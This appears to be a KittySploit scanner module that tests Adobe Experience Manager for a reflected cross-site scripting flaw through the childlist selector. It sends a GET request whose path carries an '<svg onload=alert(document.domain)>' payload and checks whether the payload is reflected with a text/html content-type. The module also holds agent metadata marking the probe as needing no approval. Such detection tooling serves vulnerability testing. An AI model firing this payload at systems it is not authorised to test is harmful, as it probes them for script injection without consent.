#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childli."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe Experience Manager - Cross-Site Scripting Detection',
        'description': 'Adobe Experience Manager contains a cross-site scripting vulnerability via requests using the selector childlist when the dispatcher does not respect the content-type responded by AEM and flips from application/json to text/html. As a consequence, the reflected suffix is executed and interpreted in the browser.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'misconfiguration', 'xss', 'aem', 'adobe', 'misconfig', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/thomashartm/burp-aem-scanner/blob/master/src/main/java/burp/actions/xss/FlippingTypeWithChildrenlistSelector.java',
            'https://cystack.net/en/plugins/cystack.remote.aem_childlist_selector_xss',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<svg onload=alert(document.domain)>', '{"path":"/etc/designs/xh1x.childrenlist.json',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="Adobe Experience Manager - Cross-Site Scripting detected",
                path='/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html',
            )
            return True
        return False

